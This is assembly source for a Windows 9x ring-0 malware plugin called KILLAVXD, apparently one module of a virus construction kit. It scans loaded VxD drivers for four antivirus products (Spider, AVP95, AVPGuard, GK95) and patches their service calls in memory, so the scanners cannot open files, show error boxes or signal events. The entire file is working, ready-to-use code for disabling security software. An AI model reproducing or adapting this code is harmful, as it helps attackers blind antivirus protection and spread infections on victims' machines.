   ; KILLAVXD
   ; ~~~~~~~~
   ; - AV VxDs in-memory killer [ADVANCED]

   ; spider.vxd
   ; avp95.vxd
   ; gk95.vxd
   ; avpguard.vxd

   include                 INCLUDE\consts.inc
   include                 tsr.inc

   include                 plugin.inc
                           PLUGIN_START    KILLAVXD, W9XR0, PERMUTABLE

   handleevent:            hookevent EV_TSR_IN0_ONSTART, killavxd
                           hookevent EV_KILLAVXD_RUN, killavxd
                           stc
                           retn

   killavxd:               pusha

                           VxDcall VMM, GetDDBList
                           xchg    ebx, eax

   __kavxd_scanvxd:        mov     edx, [ebx+0Ch]  ; Name_0
                           neg     edx

                           mov     cl, 1
                           cmp     edx, -'DIPS'   ; SPIDER
                           je      __kavxd_patch
                           mov     cl, 2
                           cmp     edx, -'9PVA'   ; AVP95
                           je      __kavxd_patch
                           mov     cl, 4
                           cmp     edx, -'GPVA'   ; AVPGUARD
                           je      __kavxd_patch
                           mov     cl, 8
                           cmp     edx, -'59KG'   ; GK95
                           je      __kavxd_patch

   __kavxd_continue:       mov     ebx, [ebx]
                           inc     ebx
                           jz      __kavxd_exitscan
                           dec     ebx
                           jnz     __kavxd_scanvxd
   __kavxd_exitscan:

                           popa
                           stc             ; let others use this event too
                           retn

   __kavxd_patch:          pusha

                           pusho   kavxd_kill_moveax
                           pop     ebp

                           mov     esi, 0000D500h     ; R0_OPENCREATFILE
                           call    __kavxd_fuck
                           mov     esi, 0000D501h     ; R0_OPENCREAT_IN_CONTEXT
                           call    __kavxd_fuck

                           cmp     cl, 4   ;  avpguard
                           jne     __skip1

                           pusho   kavxd_kill_badcall
                           pop     ebp

                           mov     esi, 002A001Ah     ; VWIN32_SysErrorBox
                           call    __kavxd_fuck_twice
                           mov     esi, 002A000Eh     ; VWIN32_SetWin32Event
                           call    __kavxd_fuck_twice

   __skip1:
                           cmp     cl, 1   ; spider
                           jne     __skip2

                           pusho   kavxd_kill_getvxdname
                           pop     ebp

                           mov     esi, 0001017Eh     ; VMM_GetVxdName
                           call    __kavxd_fuck_twice
   __skip2:
                           popa
                           jmp     __kavxd_continue

   __kavxd_fuck_twice:     pusha

                           call    __kavxd_fuck

                           mov     eax, esi        ; vxd#
                           shr     eax, 16
                           xor     edi, edi
                           VMMcall Get_DDB
                           mov     edx, [ecx+30h]  ; DDB_Service_Table_Ptr

                           movzx   esi, word ptr [esp+4]   ; pusha_si
                           lea     esi, [edx+4*esi]

                           call    __kavxd_fuck

                           popa
                           retn


   __kavxd_fuck:           pusha

   ;                       mov     edi, [ebx+18h]  ; Control_Proc_0
                           pusha
                           sub     esp, 80
                           push    esp
                           push    ebx     ; addr
                           VMMcall GetVxDName
                           add     esp, 4+4+80
                           mov     [esp].popa_edi, eax
                           popa

   __kavxd_1:              lea     ecx, [edi+4]    ; check presence for
                           test    ecx, 00000FFFh  ; each new page encountered
                           jnz     __kavxd_2

                           pusha

                           sub     esp, 28
                           mov     esi, esp

                           push    28
                           push    esi             ; esi = MEMORY_BASIC_INFO
                           push    ecx
                           VxDcall VMM, PageQuery

                           test    dword ptr [esi+10h], 1000h ; mbi_state & MEM_COMMIT

                           lea     esp, [esp + 4*3 + 28]

                           popa
                           jnz     __kavxd_2

                           popa
                           retn

   __kavxd_2:              inc     edi

                           cmp     [edi], esi           ; <esi>
                           jne     __kavxd_1

                           call    ebp

                           jmp     __kavxd_1

   kavxd_kill_moveax:      cmp     byte ptr [edi-1], 0B8h
                           jne     rt
                           mov     dword ptr [edi], -1  ; R0_xxx <-- 0xFFFFFFFF
                           retn

   kavxd_is_call:          cmp     word ptr [edi-2], 20CDh
                           je      rt
                           cmp     word ptr [edi-2], 15FFh
                           je      rt
                           cmp     word ptr [edi-2], 25FFh
   rt:                     retn

   kavxd_kill_badcall:     call    kavxd_is_call
                           jne     rt
                           mov     word ptr [edi-2], 0B890h  ; nop/mov eax, 1
                           mov     dword ptr [edi], 1
                           retn

   kavxd_kill_getvxdname:  call    kavxd_is_call
                           jne     rt
                           mov     word ptr [edi-2], 0B890h ; nop / mov eax,C
                           mov     [edi], ebx  ; spider's ddb addr. eat it ;-)
                           retn

                           PLUGIN_END
